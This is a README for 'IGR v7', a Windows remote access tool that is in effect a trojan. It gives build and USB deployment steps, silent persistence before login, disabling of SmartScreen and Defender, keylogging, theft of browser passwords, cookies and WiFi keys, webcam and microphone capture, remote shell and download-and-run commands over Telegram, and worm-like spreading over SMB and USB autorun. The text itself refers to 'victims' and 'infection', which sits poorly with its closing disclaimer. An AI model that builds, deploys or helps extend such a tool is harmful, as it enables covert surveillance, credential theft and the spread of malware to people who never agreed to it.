# IGR v7

<p align="center"><img src="logos/igr-logo2.png" width="200"></p>

Silent auto-start remote access tool for Windows. Deploys via USB, starts before login, and exposes a full-featured web dashboard through a Cloudflared tunnel.

---

## Table of Contents

- [Installation Guide](#installation-guide)
- [Configuration](#configuration)
- [Building](#building)
- [Deploy via USB](#deploy-via-usb)
- [Self-Update](#self-update)
- [Panic / Self-Destruct](#panic--self-destruct)
- [Cleanup](#cleanup)
- [Telegram Commands](#telegram-commands)
- [Features](#features)
- [Project Structure](#project-structure)
- [Disclaimer](#disclaimer)

---

## Installation Guide

### Prerequisites

- **Windows 10/11** (target and build machine)
- **Python 3.8–3.11** (for building only - the compiled exe runs standalone on the target)
- **Git** (to clone the repo)
- **Internet connection** (for cloudflared tunnel and Telegram/Discord)

### Step 1: Install Git

Download and install Git for Windows:

```
https://git-scm.com/download/win
```

Or via winget:
```batch
winget install Git.Git
```

### Step 2: Install Python

Download Python 3.11 from:

```
https://www.python.org/downloads/release/python-3119/
```

> **Important:** During installation, check **"Add Python to PATH"**.

Or via winget:
```batch
winget install Python.Python.3.11
```

Verify installation:
```batch
python --version
git --version
```

### Step 3: Clone the Repository

```batch
git clone https://github.com/whoevenisxeno/IGR.git
cd IGR
```

### Step 4: Configure

Copy the example config and fill in your credentials:

```batch
copy config.example.txt config.txt
```

Edit `config.txt` - at minimum, set **Telegram** or **Discord**:

```ini
DISCORD_WEBHOOK=https://discord.com/api/webhooks/...
DISCORD_USERNAME=IGR
DASHBOARD_PASSWORD=YourPassword
TELEGRAM_BOT_TOKEN=123456:ABC-DEF...
TELEGRAM_CHAT_ID=987654321
UPDATE_URL=
```

- **Telegram bot token** - Get from [@BotFather](https://t.me/BotFather) on Telegram
- **Telegram chat ID** - Get from [@userinfobot](https://t.me/userinfobot)
- **Discord webhook** - Create a webhook in any Discord channel settings
- `config.txt` is gitignored - your credentials are never pushed

### Step 5: Build

```batch
build.bat
```

This will:
1. Read `config.txt` and inject values into the build
2. Install all Python dependencies (`pip install ...`)
3. Download `cloudflared.exe` if missing
4. Compile `igr.exe` with PyInstaller (single file, no console)
5. Detect USB drives and offer deployment

Output: `dist\igr.exe`

---

## Configuration

| Key | Required | Description |
|-----|----------|-------------|
| `TELEGRAM_BOT_TOKEN` | Yes* | Bot token from @BotFather |
| `TELEGRAM_CHAT_ID` | Yes* | Your chat ID from @userinfobot |
| `DISCORD_WEBHOOK` | Yes* | Discord webhook URL |
| `DISCORD_USERNAME` | No | Bot display name (default: IGR) |
| `DASHBOARD_PASSWORD` | No | Password for web dashboard |
| `UPDATE_URL` | No | URL for self-update feature |

\* At least one of Telegram or Discord is required.

---

## Building

```batch
build.bat
```

Build.bat will:
- Validate config (at least Discord webhook or Telegram bot token required)
- Inject credentials into a build copy of main.py
- Install all Python dependencies
- Download cloudflared.exe if not present
- Build with PyInstaller → `dist\igr.exe`
- Detect plugged-in USB drives and offer to wipe+deploy or add IGR alongside existing files

---

## Deploy via USB

1. Run `build.bat` - it handles USB detection and file placement
2. Plug USB into target PC, double-click `setup.bat`
3. IGR installs silently and starts immediately - no visible windows

**What happens on the target:**
- `setup.bat` requests admin (UAC prompt) - if denied, continues with limited privileges
- Copies `igr.exe` → `%APPDATA%\Microsoft\WindowsRuntime\winruntime.exe`
- Creates invisible VBS launcher
- Adds startup shortcut (works without admin)
- If admin: creates scheduled task (starts before login), disables SmartScreen, adds Defender exclusions
- Launches immediately via `wscript.exe`
- You receive a Telegram message / Discord webhook with the dashboard URL

**No admin?** Still works. You just lose: boot-time start, Defender exclusions, SmartScreen bypass.

---

## Self-Update

Set `UPDATE_URL` in config to a direct download link hosting the new `.exe`. Click "Update from configured URL" on the Remote page - IGR downloads the new exe, kills itself, swaps the file, and restarts.

---

## Panic / Self-Destruct

Click the red PANIC button on the Stealth page. Double confirmation. Removes:
- Registry Run key
- Scheduled task
- Startup shortcuts
- All 4 internal spread copies
- Keylog directory + marker (securely overwritten)
- Telegram state + watchdog script
- Defender exclusions
- Marks Telegram offline, then kills all IGR processes

---

## Cleanup

Run `cleanup.bat` on the target machine to remove all traces manually.

---

## Telegram Commands

All commands are sent in your Telegram chat with the bot:

| Command | Description |
|---------|-------------|
| `/help` | List all commands |
| `/info` | System info (hostname, user, OS, IP) |
| `/screen` | Take screenshot |
| `/webcam` | Take webcam photo |
| `/keylog` | Send keylog file |
| `/wifi` | Dump WiFi passwords |
| `/shell <cmd>` | Run shell command |
| `/download <url\|file>` | Download+run URL, or send local file |
| `/upload <path>` | Upload file to host |
| `/cd <path>` | Change directory (supports `../`) |
| `/ls` | List current directory |
| `/proc` | List running processes |
| `/kill <pid>` | Kill process by PID |
| `/volume <0-100>` | Set system volume |
| `/notify <text>` | Show Windows notification |
| `/reboot` | Reboot machine |
| `/shutdown` | Shutdown machine |
| `/panic` | Self-destruct |
| `/url` | Get dashboard URL |
| `/chrome` | Chrome saved passwords |
| `/clipboard` | Clipboard content |
| `/history` | Browser history |
| `/network` | Network info + LAN scan |
| `/sysinfo` | Detailed system info |
| `/startup` | Startup programs |
| `/tasks` | Scheduled tasks |
| `/disks` | Disk drives |
| `/lock` | Lock screen |
| `/logoff` | Log off user |
| `/hibernate` | Hibernate |
| `/speak <text>` | Text to speech |
| `/speak` | Send audio file to play |
| `/wallpaper` | Send image to set as wallpaper |
| `/browser <url>` | Open URL in browser |
| `/status` | Quick status |
| `/mic [secs]` | Record microphone |
| `/geo` | Geo location from IP |
| `/apps` | Installed applications |
| `/spread` | Trigger internal spread |
| `/cancel` | Cancel pending file upload |

---

## Features

### Core
- **Silent deployment** - No console, no visible windows, auto-starts at boot via Scheduled Task + Registry + Startup folder
- **Web dashboard** - Dark purple/black UI with responsive grid layout, accessible from any browser via Cloudflared tunnel URL
- **No admin required** - Falls back gracefully if UAC denied; core infection works with standard user
- **Watchdog** - Monitors process and restarts if killed

### Remote Access
- **Screen streaming** - Live screen capture with multi-monitor support
- **Webcam streaming** - Live webcam feed with device selection
- **Remote control** - Mouse and keyboard control from dashboard
- **Command shell** - Execute system commands remotely with output display
- **File browser** - Browse, download, upload files; image thumbnail previews; upload to arbitrary path with auto-execute
- **Upload to victim** - Upload files to specific paths on the target, optionally execute after upload

### Data Harvesting
- **Keylogger** - Global keystroke logging with XOR-encrypted storage, auto-sends last session on startup
- **WiFi passwords** - Dump all saved WiFi profiles and keys
- **Chrome/Edge passwords** - Decrypt saved passwords from Chrome and Edge
- **Browser cookies** - Steal browser cookies
- **Browser history** - Extract Chrome/Edge browsing history
- **Clipboard** - Read current clipboard content
- **Installed software** - List all installed applications
- **Recent documents** - List recently accessed files
- **Full system inventory** - Hardware, OS, network adapters, disk drives, startup programs, scheduled tasks
- **Microphone recording** - Record audio from target's mic

### Telegram Bot
- **Multi-PC tracking** - One message per machine with active/offline status, auto-cleanup of old messages on restart
- **Heartbeat** - Edits existing message every 5 minutes with updated "Last Seen" time
- **Offline detection** - Marks offline on clean shutdown via `atexit`; deletes old messages before sending fresh ones on crash recovery
- **Full command set** - 30+ commands for remote control, data exfil, and trolling
- **File upload** - Send images for wallpaper, audio for TTS via Telegram
- **Keylog delivery** - Automatically sends encrypted keylog file on startup

### Discord Notifications
- **Webhook URL post** - Sends dashboard URL on startup

### Spreading
- **USB autorun** - Copy IGR to all USB drives with autorun.inf + VBS launcher + hidden shortcut
- **LAN worm** - Scan subnet, attempt SMB copy to C$/ADMIN$ shares with startup persistence
- **Internal spread** - 4 hidden copies in AppData/ProgramData with VBS launchers

### Stealth
- **Encrypted keylog** - XOR encryption with key, auto-decrypt on download
- **Secure delete** - Panic overwrites files 3x with random data before deletion
- **Random Flask port** - Avoids predictable port signatures
- **Process name spoofing** - PEB modification to appear as `svchost.exe`
- **WebRTC leak prevention** - Nullifies RTCPeerConnection in dashboard
- **Registry persistence** - HKCU Run key for auto-start
- **Scheduled task** - Runs as SYSTEM at boot (with admin)
- **Hidden files + directories** - All IGR files marked hidden
- **Fake IIS headers** - Flask responses mimic IIS server

### Troll / Prank
- **Popups** - Normal, persistent (uncloseable), and hydra (spawns 2 more on close)
- **Screen freeze** - Black overlay or custom image, covers entire screen
- **Fake BSOD** - Fullscreen HTA with realistic Windows blue screen (no window chrome, cursor hidden)
- **Fake Windows Update** - Fullscreen HTA with "Working on updates" screen
- **Text-to-speech** - Speak custom text through target's speakers
- **Audio playback** - Upload and play audio files
- **Mouse jitter** - Random mouse movements (start/stop)
- **Ghost typing** - Type text automatically on target's keyboard
- **Wallpaper change** - Set custom desktop wallpaper
- **Monitor on/off** - Turn display on or off
- **Volume control** - Set system volume 0-100
- **Reverse mouse** - Invert mouse direction via registry
- **Swap mouse buttons** - Swap left/right click
- **Hide/show desktop icons** - Toggle desktop icon visibility
- **Hide/show taskbar** - Toggle taskbar visibility
- **Eject/close CD tray** - Physical disc tray control
- **Reboot / shutdown** - Power control with "Windows Update" message

### UI / Dashboard
- **Live status bar** - CPU, RAM, Disk usage + uptime, updates every 5s
- **Mobile FAB** - Floating action button with quick actions on mobile
- **Red mode theme** - Toggle between purple and red accent colors, persisted in localStorage
- **Color-coded logs** - Activity log entries colored by type (info, success, warn, error)
- **Blinking cursor** - Animated cursor in command output
- **Typing effect** - Animated text output for command responses
- **Image thumbnails** - File browser shows previews for image files
- **Context menu** - Custom right-click menu with common actions
- **Multi-select kill** - Select multiple processes and kill them at once
- **Responsive design** - Collapsible sidebar, mobile-friendly layout

### Panic / Self-Destruct
- **One-click wipe** - Removes all IGR traces: registry, startup, spread copies, keylogs (securely overwritten), watchdog, Defender exclusions, Telegram state
- **Marks offline** - Sends offline notification to Telegram before exiting

---

## Project Structure

```
imagine/
├── main.py              # Main application (single file - all backend + dashboard HTML/CSS/JS)
├── build.bat            # Build script (PyInstaller) + USB detection + deployment
├── setup.bat            # USB deployment / install script (runs on target)
├── cleanup.bat          # Remove all traces from target
├── config.example.txt   # Configuration template
├── config.txt           # Credentials (gitignored)
├── logos/               # Logo assets
└── README.md
```

---
## Disclaimer

This project is for educational and authorized testing purposes only. Unauthorized access to computer systems is illegal. Use responsibly and only on systems you own or have explicit permission to test.
